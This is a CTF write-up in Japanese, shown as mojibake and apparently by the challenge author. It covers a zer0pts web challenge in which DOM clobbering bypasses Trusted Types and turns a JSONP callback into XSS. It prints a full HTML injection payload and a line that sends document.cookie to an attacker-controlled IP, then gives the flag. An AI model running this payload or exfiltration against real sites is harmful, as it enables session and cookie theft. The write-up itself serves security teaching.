`index.php` ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã¨ã€Trusted Types å‘¨ã‚Šã®è¨­å®šã‚’ã—ã¦ã‹ã‚‰ JSONP ãŒå‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚`jsonp` é–¢æ•°ã«ã¯ `window.callback` ãŒç¬¬äºŒå¼•æ•°ã¨ã—ã¦ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€ã“ã‚Œã¯ã©ã“ã«ã‚‚å®šç¾©ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚DOM Clobbering ã«ã‚ˆã£ã¦å€¤ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```javascript
      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
```

ã“ã®ç¬¬äºŒå¼•æ•°ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ–‡å­—åˆ—ã«å±•é–‹ã•ã‚Œã€ãã®æ–‡å­—åˆ—ã¯ `script` è¦ç´ ã® `src` å±æ€§ã«ä»£å…¥ã•ã‚Œã¦èª­ã¿è¾¼ã¾ã‚Œã€å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚DOM Clobbering ã§ä¸Šæ›¸ãã•ã‚ŒãŸå€¤ã¯ `HTMLElement` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§ã™ãŒã€ã“ã“ã§æ–‡å­—åˆ—ã«å¤‰æ›ã•ã‚Œã¾ã™ã€‚ãªã‚“ã¨ã‹ã—ã¦ä»»æ„ã®æ–‡å­—åˆ—ã«å¤‰æ›ã•ã‚Œã‚‹ã‚ˆã†ã«ã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚

```javascript
      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
```

ã²ã¨ã¤ã®æ–¹æ³•ã¯ã€`a` è¦ç´ ã‚’ä½¿ã†ã“ã¨ã§ã™ã€‚`a` è¦ç´ ã«å¯¾å¿œã™ã‚‹ `HTMLAnchorElement` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«æ–‡å­—åˆ—åŒ–ã™ã‚‹ã¨ãã® [`a` è¦ç´ ã® `href` å±æ€§ã® URL ã‚’è¿”ã—ã¾ã™](https://developer.mozilla.org/ja/docs/Web/API/HTMLAnchorElement/toString)ã€‚

![hrefå±æ€§ã®å†…å®¹ãŒè¿”ã£ã¦ãã¦ã„ã‚‹](../images/2021-03-07_blog4.png)

ä»¥ä¸‹ã®ã‚ˆã†ã« `abc` ã®ã‚ˆã†ãªé©å½“ãªã‚¹ã‚­ãƒ¼ãƒ ã® URL ã‚’ `href` å±æ€§ã«è¨­å®šã—ã¦ã‚„ã‚‹ã¨ã€æ–‡å­—åˆ—åŒ–ã•ã‚Œã‚‹éš›ã« JavaScript ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦ã‚‚è§£é‡ˆã§ãã‚‹æ–‡å­—åˆ—ã«å¤‰æ›ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```html
<a href="abc:test" id="link">hoge</a>
<script>
console.log(link + ''); // => abc:test
</script>
```

ã“ã‚Œã‚’ä½¿ãˆã°ã€`callback` ã«å¥½ããª JavaScript ã‚³ãƒ¼ãƒ‰ã‚’ä»•è¾¼ã‚“ã§å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ã‹ã—ã€`api.php` ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚“ã§ç¢ºèªã—ãŸã‚ˆã†ã«ã€`callback` ã¯æœ€å¤§ã§ 20 æ–‡å­—ã§ã™ã€‚ãªã‚“ã¨ã‹ã—ã¦ã‚‚ã£ã¨é•·ã„ JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ã¯ã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚

ã“ã‚Œã‚‚ã‚„ã¯ã‚Šã€DOM Clobbering ã§ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚`callback` ã®å€¤ã‚’æ“ä½œã—ãŸã¨ãã¨åŒã˜ã‚ˆã†ã«ã€æ–‡å­—åˆ—åŒ–ã™ã‚‹ã¨ `data:text/plain;base64,(Base64 encoded script)` ã¨ã„ã†ã‚ˆã†ã« `data` ã‚¹ã‚­ãƒ¼ãƒ ã® JavaScript ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã™ã‚ˆã†ãª `a` è¦ç´ ã‚’ä»•è¾¼ã‚“ã§ãŠãã¾ã™ã€‚

ã“ã®çŠ¶æ…‹ã§ `callback` ã« `abc:jsonp(x);//` ã¨ã„ã†ã‚ˆã†ã« `jsonp` é–¢æ•°ã‚’å‘¼ã³å‡ºã™ JavaScript ã‚³ãƒ¼ãƒ‰ã‚’ä»•è¾¼ã‚“ã§ãŠãã¨ã€`data` ã‚¹ã‚­ãƒ¼ãƒ ã® URL ãŒèª­ã¿è¾¼ã¾ã‚Œã€JavaScript ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ã“ã‚Œã¾ã§ã®æˆæœã‚’ã¾ã¨ã‚ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒã§ãã‚ãŒã‚Šã¾ã™ã€‚ã“ã‚Œã‚’ä½¿ãˆã°å¥½ããª JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```html
"><form id="trustedTypes"><input name="defaultPolicy"></form><a href="abc:jsonp(x);//" id="callback"></a><a href="data:text/plain;base64,(Base64 encoded script)" id="x"></a>
```

`location="http://(your IP address)?"+encodeURIComponent(document.cookie)` ã¨ã„ã† JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä»•è¾¼ã‚“ã§ bot ã«å ±å‘Šã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

![ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚ŒãŸ](../images/2021-03-07_blog5.png)

```
zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
```

---

> zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}

ãã†ã§ã‚‚ãªã„ã§ã™ã€‚

Firefox ãŒ Trusted Types ã‚’ã¾ã ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„ã¨çŸ¥ã£ã¦ã€ãªã«ã‹ã«ä½¿ãˆãªã„ã‹ãªãƒ¼ã¨æ€ã£ã¦ä½œã£ãŸã®ãŒã“ã®å•é¡Œã§ã—ãŸã€‚ç‰¹å®šã® Web ãƒ–ãƒ©ã‚¦ã‚¶ã§ã—ã‹è§£ã‘ãªã„å•é¡Œã‚’ä½œã£ã¦ã¿ãŸã‹ã£ãŸã¨ã„ã†ç†ç”±ã‚‚ã‚ã‚Šã¾ã™ã€‚